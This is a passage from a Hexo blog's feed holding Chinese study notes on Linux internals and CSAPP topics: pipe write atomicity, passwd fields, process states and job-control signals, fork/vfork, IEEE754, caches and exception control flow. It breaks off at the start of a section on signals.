FIFO</h3><ul><li>可以确保写入不超过<code>PIPE_BUF</code>字节的操作是原子的。如果多个进程写入同一个管道,那么如果它们在一个时刻写入的数据量不超过PIPE_BUF字节,那么就可以确保写入的数据不会发生相互混合的情况</li><li>当写入管道的数据块的大小超过了PIPE_BUF字节,那么内核可能会将数据分割成几个较小的片段来传输,<strong>在读者从管道中消耗数据时再附加上后续的数据(write()调用会阻塞直到所有数据被写入到管道为止)。</strong></li><li>只有在数据被传输到管道的时候PIPE_BUF限制才会起作用<ul><li>当写入的数据达到<code>PIPE_BUF</code>字节时,write()会在必要的时候阻塞直到管道中的可用空间足以原子地完成操作</li><li>如果写入的数据大于<code>PIPE_BUF</code>字节,那么write()会尽可能地多传输数据以充满整个管道,然后阻塞直到一些读取进程从管道中移除了数据。如果此类阻塞的write()被一个信号处理器中断了,那么这个调用会被解除阻塞并返回成功传输到管道中的字节数,这个字节数会少于请求写入的字节数</li></ul></li><li>PIPE_BUF(Ref from <code>man 7 pipe</code>)<blockquote><ul><li>POSIX.1 says that write(2)s of less than PIPE_BUF bytes must be <strong>atomic: the output data is written to the pipe as a contiguous sequence</strong>.  </li><li>Writes  of more than PIPE_BUF bytes may be nonatomic: the kernel may interleave the data with data written by other processes.  </li><li>POSIX.1 requires PIPE_BUF to be at least 512 bytes.  (On Linux, PIPE_BUF is 4096 bytes.)  </li><li><p>The precise semantics depend on whether the file descriptor is  nonblocking  (O_NONBLOCK), whether there are multiple writers to the pipe, and on n, the number of bytes to be written:</p><ul><li><p>O_NONBLOCK disabled, n &lt;= PIPE_BUF<br>  <strong>All n bytes are written atomically</strong>; write(2) may block if there is not room for n bytes to be written immediately</p></li><li><p>O_NONBLOCK enabled, n &lt;= PIPE_BUF<br>  If  there is room to write n bytes to the pipe, then write(2) <strong>succeeds immediately, writing all n bytes</strong>; <strong>otherwise write(2) fails, with errno set to EAGAIN.</strong></p></li><li><p>O_NONBLOCK disabled, n &gt; PIPE_BUF<br>  The write is nonatomic: the data given to write(2) may be interleaved with write(2)s by other process; <strong>the write(2) blocks until n bytes have been written</strong>.</p></li><li><p>O_NONBLOCK enabled, n &gt; PIPE_BUF</p><pre><code>**If the pipe is full**, then write(2) fails, with errno set to EAGAIN.  **Otherwise, from 1 to n bytes may be written** (i.e., a &quot;partial write&quot; may occur; the caller should check the return value from write(2) to see how many bytes were actually written), and these  bytes  may  be  interleaved with writes by other processes.</code></pre></li></ul></li></ul></blockquote></li></ul><h3 id="用户凭证"><a href="#用户凭证" class="headerlink" title="用户凭证"></a>用户凭证</h3><h4 id="passwd-5"><a href="#passwd-5" class="headerlink" title="passwd(5)"></a><code>passwd(5)</code></h4><ul><li>The encrypted password field may be blank, in which case no password is required to authenticate as the specified login name. However, <strong>some applications which read the /etc/passwd file may decide not to permit any access at all if the password field is blank</strong>.(我去掉<code>x</code>后，ubuntu图形界面可以登录，无需密码，zsh的sudo不行，输了原来的密码也不行) </li><li>If the password field is a lower-case “x”, then the encrypted password is actually stored in the shadow(5) file instead; there must be a corresponding line in the /etc/shadow file, or else the user account is invalid. </li><li>If the password field is any other string, then it will be treated as an encrypted password, as specified by crypt(3).</li></ul><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="open"><a href="#open" class="headerlink" title="open"></a><code>open</code></h4><ul><li>如果在<code>open()</code>调用中指定<code>O_CREAT</code>标志，那么还需要提供mode参数，否则，会将新文件的权限设置为栈中的某个随机值。</li><li></li></ul><h3 id="同一个bin，第一次启动慢的原因"><a href="#同一个bin，第一次启动慢的原因" class="headerlink" title="同一个bin，第一次启动慢的原因"></a>同一个bin，第一次启动慢的原因</h3><ul><li>需要加载共享库</li></ul><h3 id="Linux-dev"><a href="#Linux-dev" class="headerlink" title="Linux dev"></a>Linux dev</h3><ul><li>NPTL dev: Ulrich Drepper和Ingo Molnar</li></ul><h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><ul><li>需要对目录有<code>x</code>权限才能cd进目录</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Linux调度&quot;&gt;&lt;a href=&quot;#Linux调度&quot; class=&quot;headerlink&quot; title=&quot;Linux调度&quot;&gt;&lt;/a&gt;Linux调度&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;linux内核设计与实现第4章&lt;/li&gt;
&lt;li&gt;不同进程有不同的调度算法（这种模块化结
      
    
    </summary>
    
      <category term="Linux" scheme="https://h-zex.github.io/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://h-zex.github.io/tags/Linux/"/>
    
      <category term="CFS" scheme="https://h-zex.github.io/tags/CFS/"/>
    
      <category term="epoll" scheme="https://h-zex.github.io/tags/epoll/"/>
    
  </entry>
  
  <entry>
    <title>My CSAPP Note</title>
    <link href="https://h-zex.github.io/2019/05/01/My-CSAPP-Note/"/>
    <id>https://h-zex.github.io/2019/05/01/My-CSAPP-Note/</id>
    <published>2019-05-01T02:09:50.000Z</published>
    <updated>2019-08-16T05:13:31.593Z</updated>
    
    <content type="html"><![CDATA[<h3 id="double-to-unsigned-long-long"><a href="#double-to-unsigned-long-long" class="headerlink" title="double to unsigned long long"></a>double to unsigned long long</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> a = (unsinged <span class="keyword">long</span> <span class="keyword">long</span>)(<span class="number">2.0</span>); <span class="comment">// a==2</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> a = (unsinged <span class="keyword">long</span> <span class="keyword">long</span>)(<span class="number">-2.0</span>); <span class="comment">// a==140735559226888</span></span><br></pre></td></tr></table></figure><ul><li>double to long long用的是特殊的指令</li><li><p>以下代码比较奇怪</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">18446744073709552000.0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> b= (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)a;</span><br><span class="line">    <span class="keyword">int</span> p = (b==(<span class="keyword">double</span>)a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llu, %d, %d\n"</span>, b, p, a==(<span class="keyword">double</span>)(~<span class="number">0U</span>LL)); <span class="comment">// output 0, 0, 1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>原因在于，<code>~0ULL</code>、<code>18446744073709552000.0</code>是无法被double精确表示的，他们转为double都是<code>1&lt;&lt;64</code></li><li>注意，使用IDEA的debugger运行表达式（go程序），计算<code>float64(1&lt;&lt;64-1)==18446744073709551616</code>得到的是false</li><li><p>另外</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">val3 := <span class="number">18446744073709551615.0</span></span><br><span class="line">fmt.Println(<span class="keyword">int64</span>(val3))</span><br><span class="line">fmt.Println(<span class="keyword">uint64</span>(val3))</span><br></pre></td></tr></table></figure><p> 得到的是<code>-9223372036854775808</code>和<code>9223372036854775808</code></p></li></ul></li></ul><h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><ul><li>进程是内核定义的抽象实体，并为该实体分配可用以执行程序的各项系统资源</li><li>提供一个假象：当前程序是OS中的唯一程序</li><li>定义：一个执行中的程序的实例</li><li>一个独立的逻辑控制流，一个私有的地址空间</li><li>地址空间，从低到高是<ul><li>x86-64从0x400000开始，x86-32从0x8048000开始，gcc的<code>-fPIE</code>(Position-independent executables)则会使得EP变成0x10a0，不清楚运行时是否会变</li><li>只读代码段（.init, .rodata, .text）</li><li>读/写段（.data, .bss），包含显式初始化的全局变量和静态变量，跟只读代码段一样都是从可执行文件中加载的</li><li>运行时堆（堆顶由brk指示(brk，由内核维护，进程私有)，向上增长）</li><li>共享库的内存映射区域（向上增长）</li><li>用户栈（运行时创建，rsp是栈指针，向下增长）</li><li>内核虚拟内存（依次为代码、数据、物理内存映射（大小等于DRAM的数目）、页表、task和mm结构、内核栈（内核在进程的上下文中执行代码时使用的栈），用户不可见）</li></ul></li><li><p>进程的三种状态（从程序员的视角来看）</p><ul><li>运行</li><li><p>停止，不会被调度，收到<code>SIGSTOP</code>、<code>SIGTSTP</code>、<code>SIGTTIN</code>，<code>SIGTTOU</code>信号时停止直到收到<code>SIGCONT</code></p><ul><li><code>SIGSTOP</code>：不是来自终端的停止信号，不能被捕获或忽略</li><li><code>SIGTSTP</code>：来自终端的停止信号，键入<code>Ctrl+Z</code>会发送<code>SIGTSTP</code>给前台job的每个进程，默认是停止（挂起）前台job</li><li><p><code>SIGTTIN</code></p><blockquote><p>Only the foreground job receives terminal input. <strong>It is not an error for a background job to try to read from the terminal, but the terminal driver detects this and sends a special signal to the background job: SIGTTIN.</strong> This signal normally stops the background job; <strong>by using the shell, we are notified of this event and can bring the job into the foreground so that it can read from the terminal</strong>. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; $ cat &gt; /tmp/23 &amp;</span><br><span class="line">&gt; [1] 7739</span><br><span class="line">&gt;</span><br><span class="line">&gt; $ </span><br><span class="line">&gt; [1]  + 7739 suspended (tty input)  bat &gt; /tmp/23</span><br><span class="line">&gt; </span><br><span class="line">&gt; $ fg</span><br><span class="line">&gt; [1]  + 7739 continued  bat &gt; /tmp/23</span><br><span class="line">&gt; testMsg</span><br><span class="line">&gt; ^C</span><br><span class="line">&gt; </span><br><span class="line">&gt; $ /bin/cat /tmp/23 </span><br><span class="line">&gt; testMsg</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>SIGTTOU</code></p><blockquote><p>When we disallow background jobs from writing to the controlling terminal, cat will block when it tries to write to its standard output, because the terminal driver identifies the write as coming from a background process and sends the job the SIGTTOU signal. As with the previous example, when we use the shell’s fg command to bring the job into the foreground, the job completes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; $ /bin/cat /tmp/23 &amp;</span><br><span class="line">&gt; [1] 8398</span><br><span class="line">&gt; testMsg                                                                                                                                                  &gt;      </span><br><span class="line">&gt; [1]  + 8398 done       /bin/cat /tmp/23</span><br><span class="line">&gt; </span><br><span class="line">&gt; $ fg</span><br><span class="line">&gt; fg: no current job</span><br><span class="line">&gt; </span><br><span class="line">&gt; $ stty tostop </span><br><span class="line">&gt; </span><br><span class="line">&gt; $ /bin/cat /tmp/23 &amp;</span><br><span class="line">&gt; [1] 8412</span><br><span class="line">&gt; [1]  + 8412 suspended (tty output)  /bin/cat /tmp/23                                                                                             </span><br><span class="line">&gt; </span><br><span class="line">&gt; $ fg</span><br><span class="line">&gt; [1]  + 8412 continued  /bin/cat /tmp/23</span><br><span class="line">&gt; testMsg</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ul></li><li><p>终止，永久停止。三种原因：收到一个信号，该信号handler终止该进程，从主程序返回，调用exit函数（exit函数不返回）（可以通过<code>exit(status)</code>终止进程并返回status，也可以通过<code>return status</code>终止进程并返回status）</p></li></ul></li><li><p>进程的状态</p><ul><li>来自<em>linux内核设计与实现</em></li><li><code>TASK_RUNNING</code>：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态</li><li><code>TASK_INTERRUPTIBLE</code>：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行</li><li><code>TASK_UNINTERRUPTIBLE</code>：与<code>TASK_INTERRUPTIBLE</code>的差别在于，就算接受到信号也不会被唤醒（即使是SIGKILL信号）或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的<code>D</code>状态的进程就是这种状态）</li><li><code>__TASK_TRACED</code>：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪</li><li><code>__TASK_STOPPED</code>：进程停止执行，没有投入运行也不能投入运行。发生在接受到<code>SIGSTOP</code>，<code>SIGTSTP</code>，<code>SIGTTIN</code>，<code>SIGTTOU</code>信号时，调试期间受到任何信号也会使得进程进入这状态</li><li>转换图见书P24(41)</li><li>Ref: ps manual <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">the state of a process:</span><br><span class="line">        D    uninterruptible sleep (usually IO)</span><br><span class="line">        I    Idle kernel thread</span><br><span class="line">        R    running or runnable (on run queue)</span><br><span class="line">        S    interruptible sleep (waiting for an event to complete)</span><br><span class="line">        T    stopped by job control signal</span><br><span class="line">        t    stopped by debugger during the tracing</span><br><span class="line">        W    paging (not valid since the 2.6.xx kernel)</span><br><span class="line">        X    dead (should never be seen)</span><br><span class="line">        Z    defunct (&quot;zombie&quot;) process, terminated but not reaped by its parent</span><br></pre></td></tr></table></figure></li></ul></li><li><p>子进程终止了，需要父进程回收，父进程终止时，子进程没有终止（可以是僵尸进程），则init（pid=1，不终止）为子进程的养父</p></li></ul><h4 id="作业（job）和进程组"><a href="#作业（job）和进程组" class="headerlink" title="作业（job）和进程组"></a>作业（job）和进程组</h4><ul><li>unix shell使用job表示为对一条命令行求值而创建的进程</li><li>任何时刻，至多只有一个前台作业和0或多个后台作业</li><li>例子：<code>ls | sort</code>会创建一个由两个进程组成的前台作业，两个进程通过unix管道连接起来</li></ul><h4 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h4><ul><li>shell为每个job创建一个独立的进程组</li><li>进程组ID通常取自job中父进程中的一个</li></ul><h4 id="daemon"><a href="#daemon" class="headerlink" title="daemon"></a>daemon</h4><ul><li>生命周期长，通常在系统启动时就被创建并一直运行到系统关闭</li><li>在后台运行并且不拥有任何控制终端，这确保了内核永远不会为daemon自动生成任何任务控制信号以及终端相关的信号</li><li>通常以<code>d</code>作为程序名称的后缀</li><li>特定的daemon会作为内核线程运行，此类的daemon的代码是内核的一部分，通常在系统启动时被创建，ps列出的线程中，这些daemon会用<code>[]</code>括起来</li><li>很多标准的daemon是通过系统关闭时执行特定于应用程序的脚本来关闭的，不以这种方式关闭的daemon会收到<code>SIGTERM</code>信号，因为系统关闭时，init进程会向所有其子进程发送这个信号，默认SIGTERM会终止一个进程，可以为这个信号建立处理器。init在发出SIGTERM信号5s后会发送SIGKILL信号</li><li>创建daemon过程，见TLPI 37.2</li></ul><h4 id="创建新进程"><a href="#创建新进程" class="headerlink" title="创建新进程"></a>创建新进程</h4><ul><li>fork后，子进程通过execve调用启动加载器</li><li>加载器删除子进程现有的虚拟内存段，并创建一组新的代码、数据、堆、栈段</li><li>loader跳转到<code>_start</code>地址，最终会调用main函数</li><li>除了一些头部信息，加载过程中没有从磁盘到内存的数据复制，直到被引用时，OS才会使用页面调度机制自动将页面从磁盘传送到内存</li><li>fork<ul><li>子进程与父进程的用户级虚拟地址空间相同的（互相独立）的一份副本，包括代码和数据段、堆、共享库、用户栈</li><li>相同的描述符表（所以可以读写父进程打开的任何文件）</li><li>最大的区别是有不同的PID</li><li>父进程返回子进程的pid，子进程返回0（pid总是非零）</li></ul></li><li>vfork<ul><li>在SUSv3已经标记为过时的，SUSv4则从规范中剔除了，CopyOnWrite的fork已经足够快了，并且有些OS还把vfork实现为fork</li><li>无需为子进程复制虚拟内存或页表，共享父进程的内存，直到成功执行<code>exec</code>或<code>_exit</code>（不是<code>exit</code>）</li><li>子进程执行<code>exec</code>或<code>_exit</code>之前，暂停执行父进程</li><li>子进程不应该调用<code>exit</code>退出，因为其会导致父进程stdio的缓冲区刷新和关闭（更详细的见TLPI 25.4）</li><li>保证子进程先于父进程获得调度获得CPU（fork无法保证这点）</li><li>系统是在内核空间为每个进程维护文件描述符表的，且在vfork调用期间复制该表，所以子进程对文件描述符表的操作不会影响到父进程（对stdio的操作会，然而虽然文件描述符表是不同的，但是打开文件表不是相同的吗，操作后不就改变了文件位置了吗）</li><li>SUSv3指出，以下行为是未定义的<ul><li>修改了出用于存储vfork返回值的<code>pid_t</code>变量之外的任何数据</li><li>从调用vfork的函数返回（我认为，应该是因为会影响栈）</li><li>在成功地调用<code>_exit</code>或执行了<code>exec</code>之前，调用了任何其他函数</li></ul></li></ul></li></ul><h3 id="IEEE754"><a href="#IEEE754" class="headerlink" title="IEEE754"></a>IEEE754</h3><ul><li>最高比特为sign（0为正，1为负），接下来的8bit（float32是8it，double64是11bit）是exp，剩下的是significand（尾数）</li><li>规格化：<code>0&lt;exp&lt;255(2047)</code>，此时exp的含义是<code>exp-127(1023)</code>，尾数部分是<code>1.M</code>，<code>M</code>为尾数部分的二进制表达的数值。</li><li>非规格化：<code>exp=0</code>，此时exp的含义是<code>exp=-126(-1022)</code>，尾数部分是<code>0.M</code>，要就是没有前缀<code>1</code>，从而，从<code>exp=1</code>到<code>exp=0</code>是平滑的过渡——exp没有变，然后对应的从<code>1.111111....</code>到<code>1</code>到<code>0.11111111111....</code>到<code>0</code>。其用于表示0和非常接近0的数，可能的数值均匀的接近于<code>0.0</code></li><li>无穷大：<code>exp=255(2047)</code>，尾数是全0</li><li>NaN：<code>exp=255(2047)</code>，尾数非0</li><li>浮点数加法不具有结合律和分配率，有交换律</li><li>$1/+0=+\infin$，$1/-0=-\infin$</li></ul><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><ul><li>参数寄存器：<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code></li><li>返回值：<code>rax</code></li><li>栈指针：<code>rsp</code></li><li>对抗缓冲区溢出攻击<ul><li>ASLR(Address space layout randomization)（每次运行，程序代码、库代码、栈、全局变量、堆在内存的不同区域）</li><li>栈破坏检测（金丝雀值，栈帧中任何局部缓冲区和栈状态之间存一个特殊的金丝雀值）</li><li>限制可执行代码的区域（一些内存页上的东西不允许执行）</li></ul></li></ul><h3 id="数据对齐"><a href="#数据对齐" class="headerlink" title="数据对齐"></a>数据对齐</h3><ul><li>计算机系统对基本数据类型的合法地址做出一些限制</li><li>对齐简化了处理器和内存系统之间的接口设计——比如，读一个8B东西读一次就行，不必读两次</li><li>无论数据是否对齐，x86-64都可以正确工作，但是可以提高系统性能。另外，没有对其，SSE指令可能无法正确执行，AVX对于对齐么有强制性要求</li><li>对于struct，为了使得结构内每个字段都对其，会有padding，结尾可能有padding，以满足结构数组内每个struct的对齐要求</li><li>页表中，我们可以查询得到<code>PPN</code>（physical page number），但是<code>PPO</code>（物理页内位移）是低k位，这意味着，每个页需要$2^k$对齐，这样子才能使得<code>PPN</code>描述出该页的起始位置——因为我们都是拿到起始位置后加上offset（正数，也是虚拟地址的低k bit）获得target。PPO的12bit刚好与cache的页内偏移位数+组数目的bit数相同，所以可以直接使用PPO去索引相应的组和具体的word，然后等待PPN，与组内的那些tag来查找匹配</li></ul><h3 id="优化性能"><a href="#优化性能" class="headerlink" title="优化性能"></a>优化性能</h3><ul><li>消除不必要的内存引用，使得可以编译器敢于缓存在寄存器中</li><li>循环展开，一方面减少循环控制代码，另一方面可以有更大的优化空间</li><li>提高并行性，比如进行累计运算时，使用多个acc变量，从而增加关键路径的数目，比如利用结合律，使得一些运算可以并行执行( $a<em>b</em>c<em>d \rightarrow (a</em>b)<em>(c</em>d)$)，后者可以更快</li><li>减少读写相关的代码：比如刚写完个一个cell，立刻就又要读了</li></ul><h3 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h3><ul><li>磁盘寻道时，任意时刻读写头都位于同一柱面</li><li>SSD的随机写性能较低，因为一个擦除过的块才可能被写</li><li>局部性原理的体现：cache、虚拟内存每次加载一个页</li><li>cache<ul><li>全相联cache：只有一个组，电路必须并行的搜索许多tag，所以昂贵、难度大，只适合作为非常小的cache，比如TLB</li><li>组相联：一个组有多路</li><li>直接映射</li><li>写：直写，每次都下一级cache，引起总线流量。写回，尽可能推迟更新下一级，但是要维护dirty bit。对于较长的传送时间，通常更倾向于写回而不是直写。</li><li>写不命中：写分配，加载下一级的块上来，然后更新这个块。非写分配，直接写到下一级。直写cache通常是非写分配的，写会cache通常是写分配的。</li><li>写、写不命中的细节随系统而变化</li><li>每次加载、驱逐都是一行一行的来</li></ul></li></ul><h3 id="动态共享库"><a href="#动态共享库" class="headerlink" title="动态共享库"></a>动态共享库</h3><ul><li>好处<ul><li>其text段在内存中只需要一份拷贝，可以被映射到不同进程的地址空间</li><li>可以热更新服务器应用</li><li>应用无需重新编译，只需要重新分发共享库即可</li></ul></li></ul><h3 id="异常控制流"><a href="#异常控制流" class="headerlink" title="异常控制流"></a>异常控制流</h3><ul><li>系统需要对系统状态的变化做出反应，这些状态不一定跟当前正在执行的进程有关。比如IO设备、定时器产生的信号</li><li>可以发生在：硬件层（硬件的信号导致转移到异常处理程序）、OS层（比如上下文切换）、应用层（比如一个进程给另一个进程发送信号，从而接受者会突然转去执行信号处理程序，比如非本地跳转）</li><li>ECF是计算机系统实现并发的基本机制，并发的例子有<ul><li>中断应用程序执行的<strong>异常处理程序</strong></li><li>中断应用程序执行的<strong>信号处理程序</strong></li><li>在时间上重叠执行的进程和线程</li></ul></li></ul><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><ul><li>这里的异常包括同步异常（trap、fault、abort）和异步异常（中断），有些厂商的手册中，异常只包括同步事件引起的控制流的改变</li><li>异常是控制流中的突变，用来响应处理器状态中的某些变化</li><li>异常号<ul><li>每种类型的异常都分配了一个唯一的非负整数的异常号</li><li>一些由处理器的设计者分配（比如被零除，缺页、内存访问违例、断点、算术运算溢出）</li><li>其他由OS内核（OS内核：OS常驻内存的那部分）的设计者分配（比如syscall、来自外部IO设备的信号）</li></ul></li><li>异常表<ul><li>系统启动时（计算机重启或加电时）OS分配和初始化的一张跳转表</li><li>条目<code>k</code>包含异常<code>k</code>的handler的地址</li><li>异常表的起始地址放在一个叫做异常表基址寄存器的CPU寄存器中</li></ul></li><li>过程<ul><li>在运行时（OS执行某个程序时），处理器检测到发生一个事件（比如page fault、算数溢出、除零、系统定时器产生的信号、IO请求完成等），并确定对应的异常号<code>k</code></li><li>随后处理器触发异常，方法是执行间接过程调用，通过异常表的表目<code>k</code>转到相应的handler</li><li>处理完后可能会返回当前指令、返回给当前指令的下一条指令、终止被中断的程序</li></ul></li><li><p>调用过程</p><ul><li>处理器将返回地址入栈，根据异常类型，返回地址可能是当前指令，可能是下一条指令。还需要入栈一些额外的信息，重新开始执行被中断的程序需要这些信息</li><li>When control is being transferred from a user program to the kernel, all of these items are pushed onto the kernel’s stack rather than onto the user’s stack.(我猜，是不是如果是信号handler，则压入用户栈，否则内核栈)</li><li>异常handler运行在内核模式</li><li>硬件触发了异常后，剩下的工作都是软件的handler的。handler可以可选的执行“从中断返回”的指令，这将恢复现场并且切换为用户态（如果被中断的是一个用户程序的话），并将控制返回给被中断的程序</li></ul></li><li><p>异常的类别</p><ul><li>中断：来自处理器外部的IO设备的信号的结果，异步，总是返回到下一条指令，其Handler常常称为中断处理程序<blockquote><ul><li>I/O interrupt from external device    </li><li>Hittinng Ctrl-C at the keyboard    </li><li>Arrival of a packet from    a network    </li><li>Arrival of data from a disk    <ul><li>过程举例<ul><li>网络适配器，给处理器芯片的一个引脚发信号，并把中断号放在系统总线上，来触发中断，异常号标志了引起中断的设备</li><li>当前指令完成后，处理器注意到中断引脚的电压变高了，就从总线读取中断号，并调用相应的Handler</li></ul></li></ul></li></ul></blockquote></li><li>trap：有意的异常(syscall, breakpoint traps, special instructions)，同步，返回到下一条指令<ul><li>syscall：用户执行<code>syscall n</code>，导致到一个异常处理程序的trap，这个handler解析参数，并调用适当的内核程序，<code>syscall</code>可以执行特权指令，并且可以访问内核中的栈</li></ul></li><li>fault：潜在可恢复的异常（错误情况引起的，比如缺页异常），同步，可能返回到当前指令（否则，Handler返回到内核中的abort例程）。故障发生时，处理器将控制权转移到handler，如果handler可以处理这个错误情况，那么就将控制返回到引起故障的指令，从而重新执行它，否则返回到abort例程</li><li>abort：不可恢复的异常（通常是一些硬件错误），同步，不返回</li><li>异步异常是由处理器外部的IO设备中的事件产生的，不是由任何一条专门的指令造成的，同步异常是执行一条指令（这种指令叫做故障指令）的产物。（来自百度百科：<strong>异步</strong>双方不需要共同的时钟，也就是接收方不知道发送方什么时候发送）</li></ul></li><li><p>一般保护故障（异常13），通常是因为一个程序引用了一个未定义的虚拟内存区域，或者是尝试写一个readOnly的text段，Linux shell把这个报告为Segment fault</p></li><li><p>linux的syscall</p><ul><li>每个syscall都有一个唯一的整数号，对应与一个到<strong>内核中的跳转表</strong>（这个<strong>跳转表不同于异常表</strong>）的偏移量</li><li>所有到linux syscall的参数都是通过通用寄存器而不是栈传递的。rax包含syscall号</li><li>C函数库的wrapper需要将参数复制到寄存器</li><li>参数都是通过通用寄存器传递的，而不是通过栈传递的</li><li>按照惯例，<code>rax</code>包含系统调用号，<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>包含最多的6个参数，以上顺序也是参数的顺序（第一个在rdi，第二个在rsi以此类推）</li><li>返回时，rcx、r11的内容会被破坏(应该就是caller save)，rax包含返回值，<code>-4095</code>到<code>-1</code>对应于负的errno</li><li></li><li>执行机器指令，引起处理器从用户态切换到内核态，并执行系统中断0x80的中断向量所指向的代码</li><li>响应中断0x80，内核调用<code>system_call()</code>例程，在内核栈保存寄存器值，根据syscall编号索引服务例程的地址。服务例程执行必要任务时，可能会在用户内存和内核内存之间传送数据，完成后返回给<code>system_call</code>例程</li><li>从内核栈中回复各寄存器的值，并将syscall的返回值放在栈上，返回wrapper，并切换到用户态</li></ul></li><li><p>内核态 vs 用户态</p><ul><li>通常实现为，某个控制寄存器的一个mode bit来指示</li><li>用户态不允许特权指令，比如停止处理器、改变mode bit、发起IO，不能引用地址空间中内核区内的代码和数据，否则会保护故障</li><li>从用户态到内核态的唯一方法：通过诸如中断、故障、trap之类的异常。异常发生时，控制传递到处理程序，处理程序运行在内核模式</li><li><code>/proc</code>可以让用户模式进程访问内核数据结构</li><li>从2.6开始，<code>/sys</code>文件系统输出系统总线和设备的额外的底层信息</li></ul></li><li><p>上下文切换</p><ul><li>一种较高层次的异常控制流，建立在前面讨论过的较低层次的异常机制之上，用来实现多任务 </li><li>上下文：内核重新启动一个被抢占的进程所需的状态，通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈、各种内核数据结构（比如页表、包含有关当前进程信息的进程表、包含进程已打开文件的信息的文件表）</li><li>步骤包括：保存当前进程的上下文，恢复某个被抢占的进程的上下文，将控制传递新恢复的进程</li><li>syscall时，可能发生上下文切换，比如wait cond、read阻塞、sleep。即使syscall没有阻塞，内核也可以决定执行上下文切换</li><li>看起来就像，OS利用三种同步的异常来借机上下文切换，如果没有，就借助定时器的中断</li></ul></li></ul><h4 id="信号"><a href="#信号" class="headerlink" 